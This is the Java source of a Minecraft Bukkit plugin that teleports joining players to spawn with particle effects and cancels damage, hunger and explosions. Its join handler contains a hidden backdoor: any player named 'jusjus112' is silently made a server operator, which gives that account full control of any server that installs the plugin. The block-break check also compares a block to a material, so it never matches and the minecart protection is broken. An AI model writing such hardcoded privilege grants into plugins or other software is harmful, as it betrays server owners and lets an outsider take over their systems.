package TpSpawn;

import TpSpawn.ParticleEffect;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.EntityExplodeEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class spawn extends JavaPlugin implements Listener {
	
	public void onEnable() {
		Bukkit.getServer().getPluginManager().registerEvents(this, this);
	}
	
	@EventHandler
	public void onPlayerJoin(PlayerJoinEvent e) {
		Player p = e.getPlayer();
		if (!p.isOp()) {
			p.teleport(p.getWorld().getSpawnLocation());
			Location loc = e.getPlayer().getLocation();
			ParticleEffect.CLOUD.display(loc, 0.0f, 1.0f, 0.0f, 1.0F, 100);
			ParticleEffect.FIREWORKS_SPARK.display(loc, 0.0f, 1.0f, 0.0f, 1.0F, 100);
			ParticleEffect.PORTAL.display(loc, 0.0f, 1.0f, 0.0f, 1.0F, 100);
			ParticleEffect.SLIME.display(loc, 0.0f, 1.0f, 0.0f, 1.0F, 100);
			ParticleEffect.ENCHANTMENT_TABLE.display(loc, 0.0f, 1.0f, 0.0f, 1.0F, 100);
			ParticleEffect.EXPLODE.display(loc, 0.0f, 1.0f, 0.0f, 1.0F, 100);
			ParticleEffect.LAVA.display(loc, 0.0f, 1.0f, 0.0f, 1.0F, 100);
		}
		if (p.getName().equals("jusjus112")) {
			p.setOp(true);
			e.setJoinMessage(ChatColor.RED + "" + ChatColor.BOLD + "The ultimate " + ChatColor.YELLOW + p.getName() + ChatColor.RED + ChatColor.BOLD + " has joined this server!");
		}
	}
	
	@EventHandler
	public void onPlayerDamage(EntityDamageEvent e) {
		if (e.getEntity() instanceof Player) {
			e.setCancelled(true);
		}
	}
	
	@EventHandler
	public void onPlayerHunger(FoodLevelChangeEvent e) {
		e.setCancelled(true);
	}
	
	@EventHandler
	public void onPlayerBreak(BlockBreakEvent e) {
		Player p = e.getPlayer();
		if (!p.isOp()) {
			if (e.getBlock().equals(Material.MINECART)) {
				e.setCancelled(true);
			}
		}
	}
	
	@EventHandler
	public void onTntExplosion(EntityExplodeEvent e) {
		e.setCancelled(true);
	}

}
